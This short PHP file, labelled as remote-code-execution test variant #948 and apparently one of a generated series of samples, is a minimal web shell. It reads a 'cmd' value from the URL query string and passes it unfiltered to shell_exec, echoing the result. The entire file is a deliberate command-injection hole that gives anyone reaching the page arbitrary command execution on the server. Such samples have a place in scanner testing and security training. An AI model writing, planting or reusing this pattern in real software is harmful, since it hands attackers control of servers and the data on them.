<?php
// RCE test variation #948
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>